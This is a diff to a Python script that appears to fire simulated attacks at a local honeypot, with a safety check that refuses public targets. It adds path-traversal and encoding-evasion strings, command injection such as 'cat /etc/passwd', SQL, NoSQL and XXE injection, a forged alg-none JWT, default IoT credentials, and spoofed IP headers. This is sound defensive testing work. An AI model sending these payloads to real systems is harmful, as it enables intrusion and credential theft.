@@ -359,19 +359,52 @@ def malware_simulation(target, port=HTTP_PORT):
         "/shell.php", "/c99.php", "/r57.php", "/webshell.php", "/cmd.php", "/backdoor.php",
         "/upload.php", "/file.php", "/eval.php", "/system.php", "/exec.php", "/passthru.php",
         "/wso.php", "/b374k.php", "/adminer.php", "/phpmyadmin.php", "/mysql.php",
-        "/database.php", "/config.php", "/wp-config.php", "/configuration.php"
+        "/database.php", "/config.php", "/wp-config.php", "/configuration.php",
+        # Advanced malware paths
+        "/shell.jsp", "/cmd.asp", "/webshell.aspx", "/evil.war", "/malware.ear",
+        "/crypto.php", "/ransomware.php", "/keylogger.js", "/botnet.py", "/trojan.exe",
+        "/rootkit.sh", "/spyware.dll", "/adware.jar", "/worm.bat", "/virus.com",
+        # Steganography and covert channels
+        "/image.php", "/logo.asp", "/favicon.jsp", "/style.php", "/script.asp",
+        # Memory corruption attempts
+        "/buffer.php", "/overflow.asp", "/heap.jsp", "/stack.php", "/rop.asp",
+        # Privilege escalation
+        "/sudo.php", "/su.asp", "/admin.jsp", "/root.php", "/system.asp"
     ]
     malware_agents = [
         "Mozilla/5.0 (compatible; Baiduspider/2.0)", "python-requests/2.25.1", "curl/7.68.0",
-        "Wget/1.20.3", "masscan/1.0.5", "nmap", "sqlmap", "nikto", "dirb", "gobuster"
+        "Wget/1.20.3", "masscan/1.0.5", "nmap", "sqlmap", "nikto", "dirb", "gobuster",
+        # Advanced malware agents
+        "Metasploit/6.2.0", "Cobalt Strike/4.5", "Empire/3.8.0", "PoshC2/7.0",
+        "Sliver/1.5.0", "Mythic/2.3.0", "Covenant/0.7", "SharpC2/1.0",
+        # Custom malware signatures
+        "APT-Hunter/1.0", "DarkNet-Scanner/2.1", "CriminalBot/3.4", "HackerTool/1.7",
+        "ExploitKit/4.2", "MalwareDropper/2.8", "C2-Client/1.9", "Backdoor-Agent/3.1"
     ]
     
     results = []
-    for i in range(150):  # Significantly increased
+    for i in range(200):  # Increased from 150
         path = random.choice(malware_paths)
         agent = random.choice(malware_agents)
         url = f"http://{target}:{port}{path}"
-        headers = {"User-Agent": agent}
+        
+        # Advanced headers to simulate real malware
+        headers = {
+            "User-Agent": agent,
+            "X-Forwarded-For": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
+            "X-Real-IP": "10.0.0.1",
+            "X-Originating-IP": f"172.16.{random.randint(1,254)}.{random.randint(1,254)}",
+            "X-Remote-IP": f"127.0.0.{random.randint(1,254)}",
+            "CF-Connecting-IP": f"203.0.113.{random.randint(1,254)}",
+            "X-Client-IP": f"198.51.100.{random.randint(1,254)}"
+        }
+        
+        # Randomly add suspicious headers
+        if random.random() > 0.7:
+            headers["X-Command"] = random.choice(["whoami", "id", "uname -a", "cat /etc/passwd"])
+        if random.random() > 0.8:
+            headers["X-Payload"] = "base64:Y21kIC9jIGRpciAmIGVjaG8gSGFja2VkIQ=="
+        
         try:
             r = requests.get(url, headers=headers, timeout=3)
             results.append((path, agent, r.status_code))
@@ -422,13 +455,225 @@ def ftp_brute_force(target, port=FTP_PORT):
     
     return results
 
+def advanced_evasion_techniques(target, port=HTTP_PORT):
+    """Simulate advanced evasion and obfuscation techniques"""
+    evasion_payloads = [
+        # URL encoding variations
+        "/%2e%2e/%2e%2e/etc/passwd",
+        "/%252e%252e/etc/passwd",
+        "/%c0%ae%c0%ae/etc/passwd",
+        # Unicode encoding
+        "/\u002e\u002e/etc/passwd",
+        "/\uff0e\uff0e/etc/passwd",
+        # Double encoding
+        "/%252e%252e%252fetc%252fpasswd",
+        # Case variations
+        "/AdMiN/", "/ADMIN/", "/admin/", "/AdmIn/",
+        # Parameter pollution
+        "?user=admin&user=guest&user=root",
+        # HTTP verb tampering
+        "POST /?_method=DELETE",
+        # Header injection
+        "/?header=value%0d%0aX-Injected: true",
+        # Null byte injection
+        "/admin%00.txt",
+        "/config.php%00.jpg",
+        # Fragment attacks
+        "#/../../../etc/passwd",
+        # Base64 obfuscation
+        "/?payload=" + "YWRtaW4=",  # base64('admin')
+        "/?cmd=" + "Y2F0IC9ldGMvcGFzc3dk",  # base64('cat /etc/passwd')
+    ]
+    
+    results = []
+    for i in range(100):
+        payload = random.choice(evasion_payloads)
+        url = f"http://{target}:{port}{payload}"
+        
+        # Use different HTTP methods for evasion
+        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
+        method = random.choice(methods)
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "*/*",
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "close",
+            # Evasion headers
+            "X-Originating-IP": "127.0.0.1",
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Remote-IP": "127.0.0.1",
+            "X-Remote-Addr": "127.0.0.1"
+        }
+        
+        try:
+            if method == 'GET':
+                r = requests.get(url, headers=headers, timeout=3)
+            elif method == 'POST':
+                r = requests.post(url, headers=headers, data={"payload": payload}, timeout=3)
+            else:
+                r = requests.request(method, url, headers=headers, timeout=3)
+            
+            results.append((method, payload, r.status_code))
+        except Exception as e:
+            results.append((method, payload, f"ERR: {str(e)}"))
+        
+        time.sleep(0.1)
+    
+    return results
+
+def api_attack_simulation(target, port=HTTP_PORT):
+    """Simulate API-specific attacks"""
+    api_endpoints = [
+        "/api/v1/users", "/api/v2/auth", "/api/admin/users", "/api/internal/config",
+        "/graphql", "/v1/graphql", "/api/graphql", "/query",
+        "/rest/api/2/user", "/rest/api/latest/user",
+        "/api/users/{id}", "/api/users/1", "/api/users/admin",
+        "/api/auth/login", "/api/auth/register", "/api/auth/reset",
+        "/api/admin/delete", "/api/admin/backup", "/api/admin/logs",
+        "/api/files/upload", "/api/files/download", "/api/files/../../../etc/passwd",
+        "/swagger.json", "/swagger-ui.html", "/openapi.json",
+        "/health", "/actuator/health", "/actuator/env", "/actuator/configprops"
+    ]
+    
+    api_payloads = {
+        "injection": {
+            "id": "1' OR '1'='1",
+            "user": "admin'; DROP TABLE users;--",
+            "filter": "name=test' UNION SELECT password FROM users--"
+        },
+        "nosql": {
+            "where": "this.username == 'admin' || true",
+            "user": {"$where": "this.username == 'admin'"},
+            "id": {"$ne": None}
+        },
+        "xxe": {
+            "xml": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"
+        },
+        "deserialization": {
+            "data": "rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAFdGVzdHQABHRlc3R4"
+        },
+        "jwt": {
+            "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYzMjc0MjQwMH0."
+        }
+    }
+    
+    results = []
+    for i in range(150):
+        endpoint = random.choice(api_endpoints)
+        attack_type = random.choice(list(api_payloads.keys()))
+        payload = api_payloads[attack_type]
+        
+        url = f"http://{target}:{port}{endpoint}"
+        
+        headers = {
+            "User-Agent": "API-Scanner/2.0",
+            "Content-Type": "application/json",
+            "Accept": "application/json",
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.token"
+        }
+        
+        try:
+            if random.choice([True, False]):  # Mix GET and POST
+                # GET with query parameters
+                params = payload if isinstance(payload, dict) else {"data": str(payload)}
+                r = requests.get(url, headers=headers, params=params, timeout=3)
+            else:
+                # POST with JSON body
+                json_data = payload if isinstance(payload, dict) else {"payload": payload}
+                r = requests.post(url, headers=headers, json=json_data, timeout=3)
+            
+            results.append((endpoint, attack_type, r.status_code))
+        except Exception as e:
+            results.append((endpoint, attack_type, f"ERR: {str(e)}"))
+        
+        time.sleep(0.1)
+    
+    return results
+
+def iot_device_simulation(target, port=HTTP_PORT):
+    """Simulate IoT device exploitation attempts"""
+    iot_paths = [
+        # Router admin panels
+        "/admin", "/management", "/cgi-bin/luci", "/cgi-bin/webif",
+        "/rom-0", "/etc/passwd", "/proc/version", "/proc/cpuinfo",
+        # Camera interfaces
+        "/web/cgi-bin/hi3510/param.cgi", "/cgi-bin/nobody/Machine.cgi",
+        "/videostream.cgi", "/snapshot.cgi", "/view/viewer.html",
+        # IoT specific paths
+        "/goform/SetSysTimeCfg", "/goform/WifiBasicSet", "/goform/WifiWpsStart",
+        "/api/system/deviceinfo", "/api/system/reboot", "/api/system/factory_reset",
+        # Smart device APIs
+        "/upnp/control/basicevent1", "/setup/deviceinfo", "/gena.cgi",
+        "/portal/", "/app/", "/mobile/", "/smart/", "/iot/"
+    ]
+    
+    iot_exploits = [
+        # Command injection
+        "system('cat /etc/passwd')",
+        "$(cat /etc/passwd)",
+        "`cat /etc/passwd`",
+        # CVE specific
+        "../../../../etc/passwd%00",
+        "/bin/sh;cat /etc/passwd",
+        # Router specific
+        "admin:admin", "root:root", "guest:guest",
+        # IoT credentials
+        "888888", "123456", "admin", "password",
+        # Firmware attacks
+        "busybox", "dropbear", "telnetd"
+    ]
+    
+    iot_agents = [
+        "Mirai-Botnet/1.0", "IoT-Scanner/2.1", "RouterHunter/3.0",
+        "ThingBot/1.5", "DeviceExploit/2.8", "IoTHunter/4.2"
+    ]
+    
+    results = []
+    for i in range(100):
+        path = random.choice(iot_paths)
+        exploit = random.choice(iot_exploits)
+        agent = random.choice(iot_agents)
+        
+        url = f"http://{target}:{port}{path}"
+        
+        headers = {
+            "User-Agent": agent,
+            "Accept": "*/*",
+            "Connection": "close"
+        }
+        
+        try:
+            # Mix different attack methods
+            if random.choice([True, False]):
+                # GET request with exploit in URL
+                r = requests.get(f"{url}?cmd={exploit}", headers=headers, timeout=3)
+            else:
+                # POST request with exploit in body
+                data = {"username": exploit, "password": exploit, "cmd": exploit}
+                r = requests.post(url, headers=headers, data=data, timeout=3)
+            
+            results.append((path, exploit[:30], r.status_code))
+        except Exception as e:
+            results.append((path, exploit[:30], f"ERR: {str(e)}"))
+        
+        time.sleep(0.1)
+    
+    return results
+
 def main(target):
     if not check_target_safety(target):
         print("[!] Target appears public or unsafe. Aborting. Only localhost/private networks allowed.")
         return
 
-    print("[*] Starting comprehensive attack simulation with 1000+ attacks...")
+    print("[*] Starting ENHANCED attack simulation with 2000+ attacks...")
     print(f"[*] Target: {target}")
+    print("[*] Enhanced features:")
+    print("    • Advanced malware signatures")
+    print("    • Evasion techniques")
+    print("    • API-specific attacks")
+    print("    • IoT device exploitation")
+    print("    • Enhanced header manipulation")
     print("=" * 60)
 
     # 1. Port scanning
@@ -522,9 +767,52 @@ def main(target):
         print(f"  Scanner: {ua[:30]}... -> {status}")
     print()
 
+    # 16. Advanced evasion techniques
+    print("[*] Phase 16: Advanced evasion techniques (100 attempts)...")
+    for method, payload, status in advanced_evasion_techniques(target):
+        print(f"  {method} {payload[:40]}... -> {status}")
+    print()
+
+    # 17. API attack simulation
+    print("[*] Phase 17: API attack simulation (150 attempts)...")
+    for endpoint, attack_type, status in api_attack_simulation(target):
+        print(f"  {endpoint} ({attack_type}) -> {status}")
+    print()
+
+    # 18. IoT device simulation
+    print("[*] Phase 18: IoT device exploitation (100 attempts)...")
+    for path, exploit, status in iot_device_simulation(target):
+        print(f"  {path} exploit={exploit}... -> {status}")
+    print()
+
+    # 19. Advanced password cracking attacks
+    print("[*] Phase 19: Advanced password cracking (800+ attempts)...")
+    try:
+        from attacker_sim.password_attacks import advanced_password_cracking_simulation
+        password_results = advanced_password_cracking_simulation(target)
+        password_attack_count = sum(len(results) for results in password_results.values())
+        print(f"  Password cracking complete: {password_attack_count} attempts")
+    except ImportError:
+        print("  Password attack module not available")
+        password_attack_count = 0
+    except Exception as e:
+        print(f"  Password attack error: {e}")
+        password_attack_count = 0
+
     print("=" * 60)
-    total_attacks = 200 + 150 + 120 + 100 + 80 + 150 + 150 + 60 + 200 + 50 + 20 + 200 + 120 + 80
-    print(f"[*] Simulation complete! Total attacks launched: {total_attacks}+")
+    # Updated total count including password attacks
+    original_attacks = 200 + 150 + 120 + 100 + 80 + 150 + 200 + 60 + 200 + 50 + 20 + 200 + 120 + 80  # Updated malware count
+    new_attacks = 100 + 150 + 100  # Evasion, API, IoT
+    password_attacks = password_attack_count
+    total_attacks = original_attacks + new_attacks + password_attacks
+    print(f"[*] ULTIMATE simulation complete! Total attacks launched: {total_attacks}+")
+    print("[*] Attack categories included:")
+    print("    - Advanced evasion techniques")
+    print("    - API-specific attacks")
+    print("    - IoT device exploitation")
+    print("    - Sophisticated password cracking")
+    print("    - Multi-service brute force")
+    print("    - Credential stuffing attacks")
     print("[*] Check honeypot logs for captured events.")
     print("[*] Run: python -m honeypot.services.analyzer")
     print("=" * 60)
